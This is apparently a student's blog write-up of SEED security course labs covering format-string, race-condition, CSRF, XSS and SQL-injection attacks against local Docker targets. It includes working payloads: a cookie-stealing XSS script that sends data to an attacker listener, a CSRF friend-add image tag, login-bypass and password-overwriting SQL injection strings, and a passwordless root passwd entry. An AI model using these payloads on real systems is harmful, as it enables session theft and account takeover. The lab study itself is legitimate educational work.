<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230202164829006.png" alt="image-20230202164829006"></p>
<h2 id="Task-3-Modifying-the-Server-Program’s-Memory"><a href="#Task-3-Modifying-the-Server-Program’s-Memory" class="headerlink" title="Task 3: Modifying the Server Program’s Memory"></a>Task 3: Modifying the Server Program’s Memory</h2><p><strong>Task 3.A: Change the value to a different value.</strong> In this sub-task, we need to change the content of the target variable to something else. Your task is considered as a success if you can change it to a different value, regardless of what value it may be. The address of the target variable can be found from the server printout.</p>
<p>目标值地址：0x080e5068</p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230202165306107.png" alt="image-20230202165306107"></p>
<p>当指针移到输入指定的目标值地址时，用“%n”写入即可</p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230202165358789.png" alt="image-20230202165358789"></p>
<p><strong>Task 3.B: Change the value to 0x5000.</strong> In this sub-task, we need to change the content of the target variable to a specific value 0x5000. Your task is considered as a success only if the variable’s value becomes 0x5000.</p>
<p>意味着，当指针移动到目标值的位置时，要已经输出了0x5000个字符</p>
<p>构造输入：</p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230202173209458.png" alt="image-20230202173209458"></p>
<p>0x5000 - 4（地址，不可打印字符也会被算进去） + 9×62 + 1（写值之前有个“.”） &#x3D; 19917</p>
<p>成功</p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230202173424947.png" alt="image-20230202173424947"></p>
<p><strong>Task 3.C: Change the value to 0xAABBCCDD.</strong> This sub-task is similar to the previous one, except that the target value is now a large number. In a format string attack, this value is the total number of characters that are printed out by the <code>printf()</code> function; printing out this large number of characters may take hours. You need to use a faster approach. The basic idea is to use <code>%hn</code> or <code>%hhn</code>, instead of <code>%n</code>, so we can modify a two-byte (or one-byte) memory space, instead of four bytes. Printing out 216 characters does not take much time. More details can be found in the SEED book.</p>
<p>目标值地址：0x080e5068，拆成高低两字节两个部分：0x080e5068（低）、0x080e506a（高）</p>
<p>0x080e5068（低）写0xCCDD，0x080e506a（高）写0xAABB</p>
<p>构造输入：</p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230202181826397.png" alt="image-20230202181826397"></p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230202181847378.png" alt="image-20230202181847378"></p>
<p>成功：</p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230202181937764.png" alt="image-20230202181937764"></p>
<h2 id="Task-4-Inject-Malicious-Code-into-the-Server-Program"><a href="#Task-4-Inject-Malicious-Code-into-the-Server-Program" class="headerlink" title="Task 4: Inject Malicious Code into the Server Program"></a>Task 4: Inject Malicious Code into the Server Program</h2><p>从回显得知<code>myprintf</code>的帧指针为“0xff8ce6f8”，buffer的地址为“0xff8ce7d0”</p>
<p>目标跳转到buffer+0x30的位置，即0xff8ce800</p>
<p>目标值地址：0xff8ce6f8 + 4&#x3D;0xff8ce6fc，拆成高低两字节两个部分：0xff8ce6fc（低）、0xff8ce6fe（高）</p>
<p>0xff8ce6fc（低）写0xe800，0xff8ce6fe（高）写0xff8c</p>
<hr>
<p>但是发现每次尝试的帧指针都会变，不太行</p>
<h1 id="06-Race-Condition"><a href="#06-Race-Condition" class="headerlink" title="06_Race_Condition"></a>06_Race_Condition</h1><p>三个不同层次的竞态条件漏洞：</p>
<ol>
<li>TOCTTOU（应用层）</li>
<li>脏牛（内核层）</li>
<li>熔断、幽灵（硬件层）</li>
</ol>
<h2 id="Environment-Setup-3"><a href="#Environment-Setup-3" class="headerlink" title="Environment Setup"></a>Environment Setup</h2><p>先事先关闭Ubuntu的内置保护<br><code>sudo sysctl -w fs.protected_symlinks=0</code><br><code>sudo sysctl fs.protected_regular=0</code></p>
<p>目标程序<code>vulp.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> * fn = <span class="string">&quot;/tmp/XYZ&quot;</span>;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">60</span>];</span><br><span class="line">    FILE *fp;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* get user input */</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%50s&quot;</span>, buffer );</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(!access(fn, W_OK)) &#123;</span><br><span class="line">        fp = fopen(fn, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">        fwrite(<span class="string">&quot;\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="type">char</span>), <span class="number">1</span>, fp);</span><br><span class="line">        fwrite(buffer, <span class="keyword">sizeof</span>(<span class="type">char</span>), <span class="built_in">strlen</span>(buffer), fp);</span><br><span class="line">        fclose(fp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;No permission \n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>设成<code>Set-UID</code></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ gcc vulp.c -o vulp</span><br><span class="line">$ <span class="built_in">sudo</span> <span class="built_in">chown</span> root vulp</span><br><span class="line">$ <span class="built_in">sudo</span> <span class="built_in">chmod</span> 4755 vulp</span><br></pre></td></tr></table></figure>

<h2 id="Task-1-Choosing-Our-Target"><a href="#Task-1-Choosing-Our-Target" class="headerlink" title="Task 1: Choosing Our Target"></a>Task 1: Choosing Our Target</h2><p>测试新建空密码的root账户，<code>sudo gedit /etc/passwd</code>，最末尾添加：“test:U6aMy0wojraho:0:0:test:&#x2F;root:&#x2F;bin&#x2F;bash”</p>
<p><code>su test</code>，不输入密码，成功：</p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230203213449776.png" alt="image-20230203213449776"></p>
<p>最后删除新添加的行</p>
<h2 id="Task-2-Launching-the-Race-Condition-Attack"><a href="#Task-2-Launching-the-Race-Condition-Attack" class="headerlink" title="Task 2: Launching the Race Condition Attack"></a>Task 2: Launching the Race Condition Attack</h2><h1 id="07-Web-CSRF-Elgg"><a href="#07-Web-CSRF-Elgg" class="headerlink" title="07_Web_CSRF_Elgg"></a>07_Web_CSRF_Elgg</h1><h2 id="Lab-Environment-Setup-1"><a href="#Lab-Environment-Setup-1" class="headerlink" title="Lab Environment Setup"></a>Lab Environment Setup</h2><p><code>docker-compose build</code><br><code>docker-compose up</code></p>
<p>10.9.0.5：Web服务器，<a target="_blank" rel="noopener" href="http://www.seed-server.com(apache)/">www.seed-server.com（Apache）</a><br>10.9.0.6：MySQL服务器，<a target="_blank" rel="noopener" href="http://www.attacker32.com/">www.attacker32.com</a><br>10.9.0.105：攻击机</p>
<p>修改一下<code>/etc/hosts</code>，加入下列映射：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10.9.0.5	www.seed-server.com</span><br><span class="line">10.9.0.5	www.example32.com</span><br><span class="line">10.9.0.105	www.attacker32.com</span><br></pre></td></tr></table></figure>

<h2 id="Lab-Tasks-Attacks"><a href="#Lab-Tasks-Attacks" class="headerlink" title="Lab Tasks: Attacks"></a>Lab Tasks: Attacks</h2><h3 id="Task-1-Observing-HTTP-Request"><a href="#Task-1-Observing-HTTP-Request" class="headerlink" title="Task 1: Observing HTTP Request"></a>Task 1: Observing HTTP Request</h3><p>ob请求头</p>
<h3 id="Task-2-CSRF-Attack-using-GET-Request"><a href="#Task-2-CSRF-Attack-using-GET-Request" class="headerlink" title="Task 2: CSRF Attack using GET Request"></a>Task 2: CSRF Attack using GET Request</h3><p>我是Samy，想强加Alice好友，Samy的账户密码：samy&#x2F;seedsamy</p>
<p>登入之后，从菜单-&gt;Member里面找到Alice的页面，加好友，观察请求URL</p>
<p><code>http://www.seed-server.com/action/friends/add?friend=56&amp;__elgg_ts=1676632886&amp;__elgg_token=cct9n2qizw7nE8vUNPbqRw&amp;__elgg_ts=1676632886&amp;__elgg_token=cct9n2qizw7nE8vUNPbqRw</code></p>
<p>得知Alice的id是56，并得到了添加好友的API</p>
<p>检查自己用户页面的元素，发现自己的id是59</p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230217194615158.png" alt="image-20230217194615158"></p>
<p>进入攻击机容器的shell：<code>docker exec -it &lt;攻击机容器id&gt; /bin/sh</code><br>编辑<code>/var/www/attacker/addfriend.html</code></p>
<p>cat查看：</p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230217193758752.png" alt="image-20230217193758752"></p>
<p>要修改的是第4行，使用sed工具：<code>sed &#39;4c\&lt;img src=&quot;http://www.seed-server.com/action/friends/add?friend=59&quot; alt=&quot;image&quot; width=&quot;1&quot; height=&quot;1&quot; /&gt;&#39; -i addfriend.html</code></p>
<p>修改后如下：</p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230217194823214.png" alt="image-20230217194823214"></p>
<p>假如Alice登了录，我们发送一个钓鱼链接给她：<code>http://www.attacker32.com/addfriend.html</code>，点击</p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230217195501965.png" alt="image-20230217195501965"></p>
<p>回到朋友页面，就发现已经加了好友</p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230217195439725.png" alt="image-20230217195439725"></p>
<h3 id="Task-3-CSRF-Attack-using-POST-Request"><a href="#Task-3-CSRF-Attack-using-POST-Request" class="headerlink" title="Task 3: CSRF Attack using POST Request"></a>Task 3: CSRF Attack using POST Request</h3><p>回到Samy账户，检查修改信息的报文格式：</p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230217200600895.png" alt="image-20230217200600895"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__elgg_token=djHsSGM7aJTUnq_a4qYHKQ&amp;__elgg_ts=1676635479&amp;name=Samy&amp;description=&lt;p&gt;I&#x27;m handsome.&lt;/p&gt; &amp;accesslevel[description]=2&amp;briefdescription=&amp;accesslevel[briefdescription]=2&amp;location=&amp;accesslevel[location]=2&amp;interests=&amp;accesslevel[interests]=2&amp;skills=&amp;accesslevel[skills]=2&amp;contactemail=&amp;accesslevel[contactemail]=2&amp;phone=&amp;accesslevel[phone]=2&amp;mobile=&amp;accesslevel[mobile]=2&amp;website=&amp;accesslevel[website]=2&amp;twitter=&amp;accesslevel[twitter]=2&amp;guid=59</span><br></pre></td></tr></table></figure>

<p>根据这个构造恶意表单，先把容器里面的网页复制出来：<code>docker cp 85ef90:/var/www/attacker/editprofile.html ./</code></p>
<p>再构造恶意页面：</p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230217201039892.png" alt="image-20230217201039892"></p>
<p>复制回去：<code>docker cp ./editprofile.html 85ef90:/var/www/attacker/editprofile.html</code></p>
<p>在容器里重启apache2服务：<code>/etc/init.d/apache2 restart</code></p>
<p>登录Alice，访问钓鱼网站，跳转到个人页面，发现信息已被修改</p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230217202502401.png" alt="image-20230217202502401"></p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230217202707121.png" alt="image-20230217202707121"></p>
<p>上述已有</p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230217202719191.png" alt="image-20230217202719191"></p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230217202731825.png" alt="image-20230217202731825"></p>
<p>不行，因为从Boby的恶意页面难以获取受害者的uid</p>
<h2 id="Lab-Tasks-Defense"><a href="#Lab-Tasks-Defense" class="headerlink" title="Lab Tasks: Defense"></a>Lab Tasks: Defense</h2><h1 id="08-Web-XSS-Elgg"><a href="#08-Web-XSS-Elgg" class="headerlink" title="08_Web_XSS_Elgg"></a>08_Web_XSS_Elgg</h1><h2 id="Lab-Environment-Setup-2"><a href="#Lab-Environment-Setup-2" class="headerlink" title="Lab Environment Setup"></a>Lab Environment Setup</h2><p>改改<code>/etc/hosts</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">10.9.0.5	www.seed-server.com</span><br><span class="line">10.9.0.5	www.example32a.com</span><br><span class="line">10.9.0.5	www.example32b.com</span><br><span class="line">10.9.0.5	www.example32c.com</span><br><span class="line">10.9.0.5	www.example60.com</span><br><span class="line">10.9.0.5	www.example70.co</span><br></pre></td></tr></table></figure>

<p><code>docker-compose build</code>、<code>docker-compose up</code></p>
<h2 id="Task-1-Posting-a-Malicious-Message-to-Display-an-Alert-Window"><a href="#Task-1-Posting-a-Malicious-Message-to-Display-an-Alert-Window" class="headerlink" title="Task 1: Posting a Malicious Message to Display an Alert Window"></a>Task 1: Posting a Malicious Message to Display an Alert Window</h2><p>个人主页打入</p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230219162725688.png" alt="image-20230219162725688"></p>
<p>保存，显示被隐藏了，但是没有弹窗，不知为啥</p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230219162801509.png" alt="image-20230219162801509"></p>
<h2 id="Task-2-Posting-a-Malicious-Message-to-Display-Cookies"><a href="#Task-2-Posting-a-Malicious-Message-to-Display-Cookies" class="headerlink" title="Task 2: Posting a Malicious Message to Display Cookies"></a>Task 2: Posting a Malicious Message to Display Cookies</h2><p>上面的地方换成<code>&lt;script&gt;alert(document.cookie);&lt;/script&gt;</code>，这次能显示出cookies了</p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230219162909091.png" alt="image-20230219162909091"></p>
<h2 id="Task-3-Stealing-Cookies-from-the-Victim’s-Machine"><a href="#Task-3-Stealing-Cookies-from-the-Victim’s-Machine" class="headerlink" title="Task 3: Stealing Cookies from the Victim’s Machine"></a>Task 3: Stealing Cookies from the Victim’s Machine</h2><p>攻击者运行<code>nc -lknv 5555</code>，监听端口</p>
<blockquote>
<p>The <code>-l</code> option is used to specify that <code>nc</code> should listen for an incoming connection rather than initiate a connection to a remote host.</p>
<p>The <code>-nv</code> option is used to have <code>nc</code> give more verbose output.</p>
<p>The <code>-k</code> option means when a connection is completed, listen for another one.</p>
</blockquote>
<p>修改Samy下的简介为<br><code>&lt;script&gt;document.write(’&lt;img src=http://10.9.0.1:5555?c=’ + escape(document.cookie) + ’ &gt;’);&lt;/script&gt;</code></p>
<h2 id="Task-4-Becoming-the-Victim’s-Friend"><a href="#Task-4-Becoming-the-Victim’s-Friend" class="headerlink" title="Task 4: Becoming the Victim’s Friend"></a>Task 4: Becoming the Victim’s Friend</h2><p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230219164953619.png" alt="image-20230219164953619"></p>
<p>注意是“Edit HTML”模式</p>
<h1 id="09-Web-SQL-Injection"><a href="#09-Web-SQL-Injection" class="headerlink" title="09_Web_SQL_Injection"></a>09_Web_SQL_Injection</h1><h2 id="Lab-Environment"><a href="#Lab-Environment" class="headerlink" title="Lab Environment"></a>Lab Environment</h2><p><code>docker-compose build</code>、<code>docker-compose up</code></p>
<h2 id="Task-1-Get-Familiar-with-SQL-Statements"><a href="#Task-1-Get-Familiar-with-SQL-Statements" class="headerlink" title="Task 1: Get Familiar with SQL Statements"></a>Task 1: Get Familiar with SQL Statements</h2><p>数据库的ip：10.9.0.6</p>
<p>进入服务器的shell：<code>docker exec -it f43c6 /bin/bash</code></p>
<p><code>mysql -u root -pdees</code></p>
<p><code>use sqllab_users;</code></p>
<p><code>show tables;</code></p>
<p><code>DESC credential;</code></p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230305100659335.png" alt="image-20230305100659335"></p>
<p><code>SELECT * FROM credential WHERE NAME=&quot;Alice&quot;;</code></p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230305100819941.png" alt="image-20230305100819941"></p>
<h2 id="Task-2-SQL-Injection-Attack-on-SELECT-Statement"><a href="#Task-2-SQL-Injection-Attack-on-SELECT-Statement" class="headerlink" title="Task 2: SQL Injection Attack on SELECT Statement"></a>Task 2: SQL Injection Attack on SELECT Statement</h2><p>登录页面的源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$input_uname</span> = <span class="variable">$_GET</span>[’username’];</span><br><span class="line"><span class="variable">$input_pwd</span> = <span class="variable">$_GET</span>[’Password’];</span><br><span class="line"><span class="variable">$hashed_pwd</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$input_pwd</span>);</span><br><span class="line">...</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT id, name, eid, salary, birth, ssn, address, email,</span></span><br><span class="line"><span class="string">			   nickname, Password</span></span><br><span class="line"><span class="string">		FROM credential</span></span><br><span class="line"><span class="string">		WHERE name= ’<span class="subst">$input_uname</span>’ and Password=’<span class="subst">$hashed_pwd</span>’&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span> -&gt; <span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// The following is Pseudo Code</span></span><br><span class="line"><span class="keyword">if</span> (id != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (name==’admin’) &#123;</span><br><span class="line">    	<span class="keyword">return</span> All employees information;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (name !=<span class="literal">NULL</span>) &#123;</span><br><span class="line">    	<span class="keyword">return</span> employee information;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	Authentication Fails;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Task-2-1-SQL-Injection-Attack-from-webpage"><a href="#Task-2-1-SQL-Injection-Attack-from-webpage" class="headerlink" title="Task 2.1: SQL Injection Attack from webpage"></a>Task 2.1: SQL Injection Attack from webpage</h3><p>username: <code>admin&#39; or &#39;1&#39;=&#39;1</code>，password随意</p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230305101902038.png" alt="image-20230305101902038"></p>
<h3 id="Task-2-2-SQL-Injection-Attack-from-command-line"><a href="#Task-2-2-SQL-Injection-Attack-from-command-line" class="headerlink" title="Task 2.2: SQL Injection Attack from command line"></a>Task 2.2: SQL Injection Attack from command line</h3><p><code>&#39;</code>: %27</p>
<p>空格: %20</p>
<p><code>=</code>: %3D</p>
<p>用命令行输入</p>
<p><code> curl &#39;www.seed-server.com/unsafe_home.php?username=admin%27%20or%20%271%27%3D%271&amp;Password%3D1&#39;</code></p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230305102533728.png" alt="image-20230305102533728"></p>
<h3 id="Task-2-3-Append-a-new-SQL-statement"><a href="#Task-2-3-Append-a-new-SQL-statement" class="headerlink" title="Task 2.3: Append a new SQL statement"></a>Task 2.3: Append a new SQL statement</h3><p>不行</p>
<blockquote>
<p>This SQL injection does not work against MySQL because in PHP’s mysqli extension the <code>mysqli::query()</code> API does not allow multiple queries to run in the database server. The issue here is with the extension and not the MySQL server itself; because the server does allow multiple SQL commands in a single string. This limitation in MySQLi extension can be overcome by using mysqli -&gt; multiquery(). But for security purposes, we should never use this API and avoid having multiple commands to be run using the SQL injection.</p>
</blockquote>
<h2 id="Task-3-SQL-Injection-Attack-on-UPDATE-Statement"><a href="#Task-3-SQL-Injection-Attack-on-UPDATE-Statement" class="headerlink" title="Task 3: SQL Injection Attack on UPDATE Statement"></a>Task 3: SQL Injection Attack on UPDATE Statement</h2><p>修改信息的源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$hashed_pwd</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$input_pwd</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE credential SET</span></span><br><span class="line"><span class="string">    	nickname=’<span class="subst">$input_nickname</span>’,</span></span><br><span class="line"><span class="string">    	email=’<span class="subst">$input_email</span>’,</span></span><br><span class="line"><span class="string">    	address=’<span class="subst">$input_address</span>’,</span></span><br><span class="line"><span class="string">    	Password=’<span class="subst">$hashed_pwd</span>’,</span></span><br><span class="line"><span class="string">    	PhoneNumber=’<span class="subst">$input_phonenumber</span>’</span></span><br><span class="line"><span class="string">    	WHERE ID=<span class="subst">$id</span>;&quot;</span>;</span><br><span class="line"><span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>

<h3 id="Task-3-1-Modify-your-own-salary"><a href="#Task-3-1-Modify-your-own-salary" class="headerlink" title="Task 3.1: Modify your own salary"></a>Task 3.1: Modify your own salary</h3><p>我是alice，我只知道薪资的列名是<code>salary</code></p>
<p>别名处填入：<code>boss&#39;, salary=99999; #</code></p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230305103722038.png" alt="image-20230305103722038"></p>
<h3 id="Task-3-2-Modify-other-people’-salary"><a href="#Task-3-2-Modify-other-people’-salary" class="headerlink" title="Task 3.2: Modify other people’ salary"></a>Task 3.2: Modify other people’ salary</h3><p>别名处填入：<code>boss&#39;, salary=1 where name=&quot;Boby&quot;; #</code></p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230305103909412.png" alt="image-20230305103909412"></p>
<h3 id="Task-3-3-Modify-other-people’-password"><a href="#Task-3-3-Modify-other-people’-password" class="headerlink" title="Task 3.3: Modify other people’ password"></a>Task 3.3: Modify other people’ password</h3><p>先算出“haha”的sha1：</p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230305104130905.png" alt="image-20230305104130905"></p>
<p>别名处填入：<code>boss&#39;, Password=&quot;637d1f5c6e6d1be22ed907eb3d223d858ca396d8&quot; where name=&quot;Boby&quot;; #</code></p>
<p>然后再用Boby&#x2F;haha，就能登入Boby的账户了</p>
<h2 id="Task-4-Countermeasure-—-Prepared-Statement"><a href="#Task-4-Countermeasure-—-Prepared-Statement" class="headerlink" title="Task 4: Countermeasure — Prepared Statement"></a>Task 4: Countermeasure — Prepared Statement</h2><blockquote>
<p>The fundamental problem of the SQL injection vulnerability is the failure to separate code from data.</p>
</blockquote>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230305104542562.png" alt="image-20230305104542562"></p>
<p>危险代码：</p>
